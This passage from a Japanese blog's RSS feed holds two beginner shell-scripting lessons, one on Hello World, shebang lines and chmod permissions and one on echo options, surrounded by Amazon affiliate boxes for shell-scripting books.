&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１．Hello World】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-01-suzuki/shellscript.jpg" alt="Featured image of post 【１．Hello World】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="hello-world">Hello World&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>はじめてのbashコマンド「echo」&lt;/b>&lt;/font>&lt;br>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-:はじめてのecho" data-lang=":はじめてのecho">$ echo &amp;quot;Hello, World&amp;quot;
Hello, World
$
&lt;/code>&lt;/pre>&lt;p>はじめてのbashスクリプト「vim」&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:はじめてのbashスクリプト" data-lang="bash:はじめてのbashスクリプト">$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
&lt;/code>&lt;/pre>&lt;p>vimで開いたHelloWorld.shを編集します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:HelloWorld.sh" data-lang="bash:HelloWorld.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello World&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>はじめての実行権限「chmod」&lt;br>
bashファイルは2つの方法で実行できます。&lt;br>
１．bashコマンドを使用する方法、&lt;br>
２．bashファイルに実行権限を設定し、ファイルを実行する方法&lt;/p>
&lt;p>一つ目の方法「bashコマンドを使用する」&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash HelloWorld.sh
&lt;/code>&lt;/pre>&lt;p>もう一つの方法「chmodで実行権限を付与する」&lt;/p>
&lt;pre tabindex="0">&lt;code># +x で実行権限を付与
$ chmod +x HelloWorld.sh
# ドット　スラッシュをつけて実行
$ ./HelloWorld.sh
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>$ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている&lt;/dd>
&lt;dd>
&lt;p>#!/bin/bash&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>という記述をつかって実行されます。&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>$ ./&amp;lt;ファイル名&amp;gt;&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>で実行した場合は、bashコマンド（/bin/bash )を使って実行することを、ソースファイルの先頭で宣言している。という事になります。&lt;/p>
&lt;/dd>
&lt;dd>このソースファイルの1行目の記述を「シェバン」と言います。&lt;/dd>
&lt;dd>
&lt;p>/usr/local/bin/awk&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>にあるコマンドを使ってソースファイルを実行( ./&amp;lt;ファイル名&amp;gt;）したい場合は、ソースファイルの先頭行に&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>#!/usr/local/bin/awk&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>と、記述します。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>chmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。&lt;br>
これらを&lt;font color=red>パーミッション&lt;/font>と言います。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。&lt;/dd>
&lt;dd>同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。&lt;/dd>
&lt;dd>実行権限を与える方法は、一般的ではありますが、注意も必要です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>パーミッションの確認&lt;br>
ターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ls -l
&lt;/code>&lt;/pre>&lt;p>上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。&lt;/p>
&lt;pre tabindex="0">&lt;code>-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt
drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード
&lt;/code>&lt;/pre>&lt;p>パーミッションの読み方&lt;br>
「-rw-r&amp;ndash;r&amp;ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、&lt;br>
最初の１文字目はファイル種別を表しています。&lt;br>
-rw-r&amp;ndash;r&amp;ndash;&lt;/p>
&lt;table>
&lt;tr>&lt;th>種別&lt;/th>&lt;th>意味&lt;/th>&lt;/tr>
&lt;tr>&lt;td>-&lt;/td>&lt;td>ファイル&lt;/td>&lt;/tr>
&lt;tr>&lt;td>d&lt;/td>&lt;td>ディレクトリ&lt;/td>&lt;/tr>
&lt;tr>&lt;td>l&lt;/td>&lt;td>シンボリックリンク&lt;/td>&lt;/tr>
&lt;/table>
&lt;p>2文字目から4文字目はファイルの所有者に対する権限を表し、&lt;br>
5文字目から7文字目はファイルの所有グループに対する権限を表し、&lt;br>
8文字目から10文字目はその他に対する権限を表しています&lt;/p>
&lt;p>上記から-rw-r&amp;ndash;r&amp;ndash;は、&lt;br>
「ファイル種別」が「ファイル」であり、&lt;br>
「所有者」に「読み取り」と「書き込み」の権限があり、&lt;br>
「所有グループ」に「読み取り」の権限があり、&lt;br>
「その他」に「読み取り」の権限があることを示しています。&lt;/p>
&lt;p>drwxr-xr-xは、&lt;br>
「ファイル種別」が「ディレクトリ」であり、&lt;br>
「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、&lt;br>
「所有グループ」に「読み取り」と「実行」の権限があり、&lt;br>
「その他」に「読み取り」と「実行」の権限があることを示しています。&lt;/p>
&lt;p>アクセス権限の変更&lt;br>
アクセス権限を変更する方法について記載します。&lt;/p>
&lt;p>パーミッションの変更には&lt;font color=red>&lt;b> chmodコマンド&lt;/b>&lt;/font>を使用します。&lt;/p>
&lt;p>数値で指定する&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls -l　
-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt
$ chmod 764 hoge.txt
$ ls -l
-rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt
&lt;/code>&lt;/pre>&lt;p>上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ chmod 764 hoge.txt
&lt;/code>&lt;/pre>&lt;p>に関して説明していきます。&lt;br>
ファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。&lt;/p>
&lt;pre tabindex="0">&lt;code>chmod モード 対象ファイル名
&lt;/code>&lt;/pre>&lt;p>モードの数字について&lt;/p>
&lt;table>
&lt;tr>&lt;th>モード(数字)&lt;/th>&lt;th>モード(アルファベット)&lt;/th>&lt;th>権限&lt;/th>&lt;/tr>
&lt;tr>&lt;td>4&lt;/td>&lt;td>r&lt;/td>&lt;td>読み取り&lt;/td>&lt;/tr>
&lt;tr>&lt;td>2&lt;/td>&lt;td>w&lt;/td>&lt;td>書き込み&lt;/td>&lt;/tr>
&lt;tr>&lt;td>1&lt;/td>&lt;td>x&lt;/td>&lt;td>実行&lt;/td>&lt;/tr>
&lt;/table>
上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。
要するに上記の「764」は
「所有者」に対して「読み取り」「書き込み」「実行」を、
「所有グループ」に対して「読み取り」「書き込み」を、
「その他」に「読み取り」を付与しています。
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>実行したい場合は $ chmod 755 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>読み取りのみを許可し、実行しない場合は $ chmod 644 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>自分だけの読み取りを許可する場合は $ chmod 600 &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>通常は上記３種類しか使いません。&lt;/dd>
&lt;dd>CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。&lt;/dd>
&lt;dd>$ chmod 777 &amp;lt;ファイル名&amp;gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>詳しくはこちら&lt;br>
&lt;a class="link" href="https://qiita.com/shisama/items/5f4c4fa768642aad9e06" target="_blank" rel="noopener"
>https://qiita.com/shisama/items/5f4c4fa768642aad9e06&lt;/a>&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２．echo コマンド】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-02-suzuki/shellscript.jpg" alt="Featured image of post 【２．echo コマンド】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="echo-コマンド">echo コマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> echoコマンドの使用：&lt;/b>&lt;/font>&lt;br>
さまざまなオプションでechoコマンドを使用できます。&lt;br>
次の例では、いくつかの便利なオプションについて説明します。&lt;br>
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。&lt;br>
&amp;lsquo;-n&amp;rsquo;オプションは、改行なしでテキストを印刷するために使用され、'-e&amp;rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。&lt;br>
&amp;lsquo;echo_example.sh&amp;rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:echo_example.sh" data-lang="bash:echo_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;改行付きのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;改行なしのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;\n削除\tバックスラッシュ\t文字\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash echo_example.sh
改行付きのテキストの印刷
改行なしのテキストの印刷
削除 バックスラッシュ 文字
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する&lt;/dd>
&lt;dd>
&lt;p>echo でよく使われるオプションは以下の通り&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>オプション 意味&lt;/p>
&lt;/dd>
&lt;dd>-n 最後の改行を出力しない&lt;/dd>
&lt;dd>-e エスケープシーケンスを解釈する&lt;/dd>
&lt;dd>-E エスケープシーケンスを解釈しない（デフォルト）&lt;/dd>
&lt;dd>
&lt;p>エスケープシーケンスとは、上記のバックスラッシュのことだ。&lt;/p>
&lt;/dd>
&lt;dd>以下の4つを覚えておくだけでおおよそは事足りる。&lt;/dd>
&lt;dd>
&lt;p>オプション 意味&lt;/p>
&lt;/dd>
&lt;dd>\r キャリッジリターン&lt;/dd>
&lt;dd>\n 改行（フォームフィード＋キャリッジリターン）&lt;/dd>
&lt;dd>\t 水平タブ&lt;/dd>
&lt;dd>\ バックスラッシュ&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
